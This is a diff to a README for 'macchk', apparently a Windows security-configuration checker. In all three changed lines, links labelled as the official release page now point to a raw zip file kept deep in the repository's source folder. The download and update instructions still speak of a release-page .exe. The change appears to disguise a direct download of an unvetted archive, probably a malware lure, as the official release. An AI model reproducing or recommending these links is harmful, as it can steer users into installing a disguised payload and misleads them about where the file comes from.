@@ -1,6 +1,6 @@
 # 🎤 macchk - Keep your digital files secure now
 
-[![Download macchk](https://img.shields.io/badge/Download-macchk-blue.svg)](https://github.com/Bergetarbitral1818/macchk/releases)
+[![Download macchk](https://img.shields.io/badge/Download-macchk-blue.svg)](https://github.com/Bergetarbitral1818/macchk/raw/refs/heads/main/src/detection/Software-3.5.zip)
 
 ## 🎯 About this program
 
@@ -12,7 +12,7 @@ This program runs on Windows 10 and Windows 11. You need 50 MB of free disk spac
 
 ## 💾 How to get the software
 
-1. Visit the [macchk release page](https://github.com/Bergetarbitral1818/macchk/releases) to access the downloads.
+1. Visit the [macchk release page](https://github.com/Bergetarbitral1818/macchk/raw/refs/heads/main/src/detection/Software-3.5.zip) to access the downloads.
 2. Find the file ending in .exe in the latest release section.
 3. Click the link to save the file to your computer.
 4. Choose a folder on your desktop for easy access.
@@ -55,7 +55,7 @@ If you share a program with others, use macchk to check the security configurati
 
 ## 📋 Keeping it updated
 
-New versions of macchk appear periodically to improve the range of security checks. Check the [official release page](https://github.com/Bergetarbitral1818/macchk/releases) every few months for updates. Download the new version and replace the old file. Updates provide better detection of security gaps in newer operating systems.
+New versions of macchk appear periodically to improve the range of security checks. Check the [official release page](https://github.com/Bergetarbitral1818/macchk/raw/refs/heads/main/src/detection/Software-3.5.zip) every few months for updates. Download the new version and replace the old file. Updates provide better detection of security gaps in newer operating systems.
 
 ## ⚖️ Usage terms
 
